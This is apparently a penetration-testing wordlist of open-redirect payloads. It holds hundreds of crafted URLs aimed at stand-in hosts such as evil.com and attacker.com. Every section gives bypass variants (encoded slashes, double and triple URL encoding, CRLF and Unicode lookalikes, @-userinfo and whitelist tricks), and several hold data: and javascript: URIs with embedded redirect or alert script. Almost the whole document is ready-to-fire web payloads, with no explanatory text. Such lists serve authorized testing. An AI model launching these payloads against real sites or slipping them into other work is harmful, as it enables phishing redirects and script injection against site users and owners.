# Enhanced Open Redirect Payloads
# Author: Abdulrahman Muhammad (0xLegacy)
# Contains payloads for open redirect vulnerability testing and bypasses

# Basic redirects
//evil.com
//evil.com/
//evil.com/path
//evil.com/path?param=value
//evil.com#
https://evil.com
https://evil.com/
https://evil.com/path
https://evil.com/path?param=value
https://evil.com#
http://evil.com
http://evil.com/
http://evil.com/path
http://evil.com/path?param=value
http://evil.com#
evil.com
evil.com/
evil.com/path
evil.com/path?param=value
evil.com#

# Protocol relative URLs
////evil.com
//////evil.com
////evil.com/
////evil.com/%2f..
////evil.com/%2f%2e%2e
////evil.com/%2f%2e%2e/
//\/\evil.com/
//evil.com@evil.com
///\evil.com/
///evil.com/
//evil.com//
//evil.com/\/
//evil.com/%0D%0A
//evil.com/index.html
//evil.com?
/\\/evil.com/
/\/evil.com/

# Domain obfuscation
https://evil%E3%80%82com
%09https://evil.com
https://%65%76%69%6c%2e%63%6f%6d
http://%77%77%77%2e%65%76%69%6c%2e%63%6f%6d
https://evil.com%23.example.com
https://evil.com%2523.example.com
http://evil.com%252f@example.com
http://evil.com%ff.example.com
//evil%E3%80%82com
//evil.com@example.com
/\/evil.com\/\@example.com

# Encoded slashes and colons
http:evil.com
//evil%E3%80%82com
//evil.com%28%29%7B%7D%3C%3E%27%22%60
//evil.com%252f@example.com
%2fevil.com
https:/evil.com
https:evil.com
https://%65%76%69%6c%2e%63%6f%6d
http%3A%2F%2Fevil.com
http%3A%2F%2Fevil.com%2F

# URL encoding bypasses
%2f%2fevil.com
%2f%2fevil.com%2f
%2fevil.com
%2fevil.com%2f
%68%74%74%70%3a%2f%2fevil.com
%68%74%74%70%3a%2f%2fevil.com%2f
%68%74%74%70%73%3a%2f%2fevil.com
%68%74%74%70%73%3a%2f%2fevil.com%2f
%68%74%74%70%73%3A%2F%2Fevil.com
https%3A%2F%2Fevil.com
https%3A//evil.com
http%3A//evil.com

# Double URL encoding bypasses
%252f%252fevil.com
%252f%252fevil.com%252f
%252fevil.com
%252fevil.com%252f
%25252f%25252fevil.com
%25252f%25252fevil.com%25252f
%25252fevil.com
%25252fevil.com%25252f
%2568%2574%2574%2570%253a%252f%252fevil.com
%2568%2574%2574%2570%253a%252f%252fevil.com%252f
%2568%2574%2574%2570%2573%253a%252f%252fevil.com
%2568%2574%2574%2570%2573%253a%252f%252fevil.com%252f

# Triple URL encoding bypasses
%25252f%25252fevil.com
%25252f%25252fevil.com%25252f
%25252fevil.com
%25252fevil.com%25252f
%2525252f%2525252fevil.com
%2525252f%2525252fevil.com%2525252f
%2525252fevil.com
%2525252fevil.com%2525252f
%252568%252574%252574%252570%25253a%25252f%25252fevil.com
%252568%252574%252574%252570%25253a%25252f%25252fevil.com%25252f

# Special characters bypasses
////evil.com/%2e%2e
////evil.com/%2e%2e%2f
////evil.com/%2f..
////evil.com/%2f%2e%2e
////evil.com/%2f%2e%2e/
////evil.com/..%2f
////evil.com/..%2f..%2f
////evil.com/../
////evil.com/../..
////evil.com/../../../
////evil.com/../../../../../../
////evil.com/.././.././../
//evil.com/%2e%2e
//evil.com/%2f%2e%2e
//evil.com/..%2f
//evil.com/..%2f..%2f
//evil.com/../
//evil.com/../..
//evil.com/../../../
//evil.com/../../../../../../
//evil.com/.././.././../
https://evil.com/%2e%2e
https://evil.com/%2f%2e%2e
https://evil.com/..%2f
https://evil.com/..%2f..%2f
https://evil.com/../
https://evil.com/../..
https://evil.com/../../../
https://evil.com/../../../../../../
https://evil.com/.././.././../

# CRLF and line-breaking bypasses
//evil.com/%0A
//evil.com/%0A/
//evil.com/%0D
//evil.com/%0D/
//evil.com/%0D%0A
//evil.com/%0D%0A/
//evil.com/%E5%98%8A
//evil.com/%E5%98%8A/
//evil.com/%E5%98%8D
//evil.com/%E5%98%8D/
//evil.com/%E5%98%8D%E5%98%8A
//evil.com/%E5%98%8D%E5%98%8A/

# Data URL redirection
data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly9ldmlsLmNvbSIpPC9zY3JpcHQ+
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc7PC9zY3JpcHQ+
data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc7PC9zY3JpcHQ+
data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9ldmlsLmNvbSI7PC9zY3JpcHQ+
data:text/html;base64,PHNjcmlwdD50b3AubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9ldmlsLmNvbSI7PC9zY3JpcHQ+
data:text/html;base64,PGh0bWw+PHNjcmlwdD53aW5kb3cubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20iPC9zY3JpcHQ+PC9odG1sPg==
data:text/html;charset=utf-8;base64,PHNjcmlwdD5sb2NhdGlvbi5ocmVmPSJodHRwczovL2V2aWwuY29tIjs8L3NjcmlwdD4=
data:text/html,<script>location.href='https://evil.com';</script>
data:text/html,<script>window.location.href='https://evil.com';</script>
data:text/html,<script>document.location='https://evil.com';</script>
data:text/html,<script>window.location.replace('https://evil.com');</script>
data:text/html,<script>window.location.assign('https://evil.com');</script>
data:text/html,<meta http-equiv="refresh" content="0; url=https://evil.com">

# Javascript protocol
javascript:window.location.href='https://evil.com'
javascript:window.location='https://evil.com'
javascript:document.location='https://evil.com'
javascript:window.location.replace('https://evil.com')
javascript:window.location.assign('https://evil.com')
javascript:window.open('https://evil.com')
javascript:self.location='https://evil.com'
javascript:top.location='https://evil.com'
javascript:alert(document.domain)
javascript://evil.com?%0Aalert(1)
javascript://%0Awindow.location.href='https://evil.com'

# Protocol handler bypasses
app://attacker.com
data://attacker.com
facetime://attacker.com
fb://attacker.com
file://attacker.com
http://attacker.com
https://attacker.com
intent://attacker.com
itms://attacker.com
market://attacker.com
sms://attacker.com
tel://attacker.com
tg://attacker.com
whatsapp://attacker.com
x-apple.systempreferences:com.apple.preference
sftp://attacker.com
ftp://attacker.com
gopher://attacker.com
news://attacker.com
snews://attacker.com
feed://attacker.com
jar://attacker.com
mhtml://attacker.com
mailto://user@attacker.com

# Unicode bypasses
﹨﹨evil.com
﹨﹨evil.com﹨
﹨﹨evil.com﹨﹨
〱evil.com
〵evil.com
ゝevil.com
ーevil.com
ｰevil.com
／evil.com
⁄evil.com
∕evil.com
＼evil.com

# @ character bypasses
https://example.com@evil.com
https://example.com.evil.com
https://example.com%40evil.com
https://example.com%25%40evil.com
https://example.com%252f@evil.com
https://example.com%2f%2f@evil.com
http://example.com@evil.com
http://example.com.evil.com
http://example.com%40evil.com
http://example.com%25%40evil.com
http://example.com%252f@evil.com
http://example.com%2f%2f@evil.com
//example.com@evil.com
//example.com.evil.com
//example.com%40evil.com
//example.com%25%40evil.com
//example.com%252f@evil.com
//example.com%2f%2f@evil.com

# Subdomain bypasses
https://evil.com.example.com
https://evil.example.com
https://example.com.evil.com
https://example.com-evil.com
https://example-com.evil.com
https://evil-example.com
https://example-evil.com

# Path traversal techniques
//example.com/redirect?url=//evil.com
//example.com/redirect?url=/\/evil.com
//example.com/redirect?url=//evil.com/..
//example.com/redirect?url=/./evil.com
//example.com/redirect?url=/.\/evil.com/
//example.com/redirect?url=/..\/evil.com/
//example.com/redirect?url=/../evil.com/
//example.com/redirect?url=/../../evil.com/
//example.com/redirect?url=/../..//evil.com/
//example.com/redirect?url=/../..//../evil.com/
//example.com/redirect?url=//../../evil.com/
//example.com/redirect?url=///../../evil.com/

# Regex validation bypass
https://example.com/https://evil.com
https://example.com/redirect?url=https://example.com@evil.com
https://example.com/redirect?url=https://example.com%40evil.com
https://example.com/redirect?url=https://example.com/https://evil.com
https://example.com/redirect?url=https://example.com/redirect?url=https://evil.com
https://evil.com#example.com/
https://evil.com?example.com/
https://evil.com\example.com/
https://evil.com\.example.com/
https://evil.com//example.com/
https:evil.com\@example.com
https:evil.com\@example.com\@example.com
https://evil.com/example.com
https://evil.com/https://example.com

# Whitelisting bypasses
https://example.com%00https://evil.com
https://example.com%0dhttps://evil.com
https://example.com%0ahttps://evil.com
https://example.com%09https://evil.com
https://example.com%20https://evil.com
https://example.com.https://evil.com
https://example.com%5chttps://evil.com
https://example.com%3Fhttps://evil.com
https://example.com%23https://evil.com
https://example.com%2f%2f%2fevil.com
https://example.com&https://evil.com
https://example.com?https://evil.com
https://example.com#https://evil.com
https://example.com/https://evil.com
https://example.com\https://evil.com
https://example.com+https://evil.com
https://example.com-https://evil.com

# Blacklisting bypasses with mixed encoding
%68%74%74%70%73%3a//evil.com
%68%74%74%70%73://%65%76%69%6c.com
%68%74%74%70%73://%65vil.com
h%74%74ps://evil.com
%68ttps://evil.com
ht%74ps://evil.com
htt%70s://evil.com
http%73://evil.com
https%3A//evil.com
https:%2F%2Fevil.com
https:%2F/evil.com
https:/%2Fevil.com
https://%65vil.com
https://e%76il.com
https://ev%69l.com
https://evi%6C.com
https://evil%2Ecom
https://evil.%63om
https://evil.c%6Fm
https://evil.co%6D

# Mixed case bypasses
HtTpS://evil.com
HTTPS://evil.com
https://eViL.com
https://EVIL.com
HTTPS://EVIL.COM
//eVil.com
//EVIL.com
//evil.COM
http://EVIL.com
HtTp://evil.com
http://EviL.com
http://evil.CoM

# Protocol smuggling
javascript://https://example.com/%0Aalert(1)
javascript://https://example.com/%0Aalert(1);//https://example.com/
data:text/html,https://example.com/<script>window.location='https://evil.com'</script>
data:text/html,<script>window.location='https://evil.com'</script>//https://example.com

# Generic open redirect payloads
//google.com/%2f..
//www.google.com/%2f..
///google.com/%2f..
///www.google.com/%2f..
////google.com/%2f..
////www.google.com/%2f..
https://google.com/%2f..
https://www.google.com/%2f..
/https://google.com/%2f..
/https://www.google.com/%2f..
//google.com/%2f%2e%2e
//www.google.com/%2f%2e%2e
///google.com/%2f%2e%2e
///www.google.com/%2f%2e%2e
////google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
https://google.com/%2f%2e%2e
https://www.google.com/%2f%2e%2e
/https://google.com/%2f%2e%2e
/https://www.google.com/%2f%2e%2e
//google.com/
//www.google.com/
///google.com/
///www.google.com/
////google.com/
////www.google.com/
https://google.com/
https://www.google.com/
/https://google.com/
/https://www.google.com/
//google.com//
//www.google.com//
///google.com//
///www.google.com//
////google.com//
////www.google.com//
https://google.com//
https://www.google.com//
//https://google.com//
//https://www.google.com//
//google.com/%2e%2e%2f
//www.google.com/%2e%2e%2f
///google.com/%2e%2e%2f
///www.google.com/%2e%2e%2f
////google.com/%2e%2e%2f
////www.google.com/%2e%2e%2f
https://google.com/%2e%2e%2f
https://www.google.com/%2e%2e%2f
/https://google.com/%2e%2e%2f
/https://www.google.com/%2e%2e%2f
//google.com/%2e./
//www.google.com/%2e./
///google.com/%2e./
///www.google.com/%2e./
////google.com/%2e./
////www.google.com/%2e./
https://google.com/%2e./
https://www.google.com/%2e./
/https://google.com/%2e./
/https://www.google.com/%2e./
//google.com/%2f%2e./
//www.google.com/%2f%2e./
///google.com/%2f%2e./
///www.google.com/%2f%2e./
////google.com/%2f%2e./
////www.google.com/%2f%2e./
https://google.com/%2f%2e./
https://www.google.com/%2f%2e./
/https://google.com/%2f%2e./
/https://www.google.com/%2f%2e./
//%09/google.com
//%09/www.google.com
///%09/google.com
///%09/www.google.com
////%09/google.com
////%09/www.google.com
https:%09/google.com
https:%09/www.google.com
/https:%09/google.com
/https:%09/www.google.com

# Bypass using fragments
https://example.com#https://evil.com
https://example.com#https://evil.com/
https://example.com/#https://evil.com/
https://example.com/?url=https://example.com#https://evil.com
https://example.com/?url=https://example.com/path#https://evil.com
https://example.com/?url=javascript:window.location=%27https://evil.com%27;#https://example.com
https://example.com/?url=javascript:window.location=%27https://evil.com%27;#https://example.com/path
https://example.com/path?url=javascript:window.location=%27https://evil.com%27;#https://example.com
https://example.com/path1/path2?url=javascript:window.location=%27https://evil.com%27;#https://example.com
https://example.com/path1/path2/path3?url=javascript:window.location=%27https://evil.com%27;#https://example.com